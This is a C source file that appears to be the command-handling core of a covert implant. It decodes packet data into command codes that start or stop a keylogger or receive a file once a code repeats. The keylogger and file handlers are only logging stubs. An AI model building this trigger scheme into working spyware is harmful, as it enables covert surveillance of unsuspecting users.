#include "utils/utils.h"
#include "protocol.h"
#include <stdio.h>
#include <stdlib.h>

int calculate_data_packet_count(const struct session_info * session_info) {
    return session_info->packet_counter - COMMAND_TRIGGER_THRESHOLD;
}

void clear_process_packets(struct session_info * session_info) {
    free_linked_list(session_info->head);
    struct packet_data * head = malloc(sizeof(struct packet_data));
    head->data = 0;
    head->next = NULL;
    session_info->head = head;
    session_info->data_counter = 0;
    session_info->packet_counter = 0;
}

bool handle_command_codes(struct session_info * session_info, const uint16_t data) {
    enum command_codes encountered_command_code = {};
    bool is_command_code = true;

    switch (data) {
        case START_KEYLOGGER:
            log_message("Start Keylogger\n");
            encountered_command_code = START_KEYLOGGER;
            break;
        case STOP_KEYLOGGER:
            log_message("Stop Keylogger\n");
            encountered_command_code = STOP_KEYLOGGER;
            break;
        case RECEIVE_FILE:
            log_message("Receiving File\n");
            encountered_command_code = RECEIVE_FILE;
            break;
        default:
            log_message("Default\n");
            is_command_code = false;
            break;
    }

    if (is_command_code) {
        if (session_info->last_command_code == encountered_command_code) {
            session_info->command_counter++;
        } else {
            session_info->last_command_code = encountered_command_code;
            session_info->command_counter = 1;
        }

        log_message("Session info counter: %d, code: %d", session_info->command_counter, encountered_command_code);

        // If the counter hits 2 then execute the corresponding function
        if (session_info->command_counter >= COMMAND_TRIGGER_THRESHOLD) {
            log_message("Triggered function call: counter %d, code: %d", session_info->command_counter, encountered_command_code);
            session_info->command_counter = 0;
            for (int i = 0; command_handler_functions[i].key != 0; i++) {
                if (command_handler_functions[i].key == encountered_command_code) {
                    command_handler_functions[i].handler(session_info);
                    return true;
                }
            }
        }

    }

    return false;
}

void handle_packet_data(struct session_info * session_info, const uint16_t data) {
    if (session_info->packet_counter == 0) {
        handle_command_codes(session_info, data);
        session_info->head->data = data;
        session_info->packet_counter++;
        return;
    }

    struct packet_data * packet_data = session_info->head;

    // Traverse to the last filled node
    while (packet_data->next != NULL) {
        packet_data = packet_data->next;
    }

    // Add data
    packet_data->next = malloc(sizeof(struct packet_data));
    packet_data->next->data = data;
    packet_data->next->next = NULL;
    session_info->packet_counter++;

    const int clear_linked_list = handle_command_codes(session_info, data);

    if (clear_linked_list) {
        log_message("Clearing linked list");
        clear_process_packets(session_info);
    }
}


void start_keylogger(struct session_info * session_info) {
    log_message("Starting Keylogger");
}

void stop_keylogger(struct session_info * session_info) {
    log_message("Stoping Keylogger");
    session_info->run_keylogger = false;
}

// NOLINTNEXTLINE
void receive_file(struct session_info * session_info) {
    const int data_packet_to_read = calculate_data_packet_count(session_info);
    log_message("Data packets to read %d", data_packet_to_read);
    log_message("Packet counter: %d, Data Counter: %d", session_info->packet_counter, session_info->data_counter);

    const struct packet_data * packet_data = session_info->head;
    for (int i = 0; i < data_packet_to_read; ++i) {
        if (packet_data == NULL) {
            log_message("Crash out, packet data does not exist");
            return;
        }
        log_message("Data to parse %d", packet_data->data);
        const uint8_t new = (packet_data->data >> 8);
        const uint8_t new_t = (packet_data->data);
        log_message("First Byte %c", new);
        log_message("First Byte D %d", new);
        log_message("Second Byte %c", new_t);
        log_message("Second Byte D %d", new_t);

        packet_data = packet_data->next;
    }

}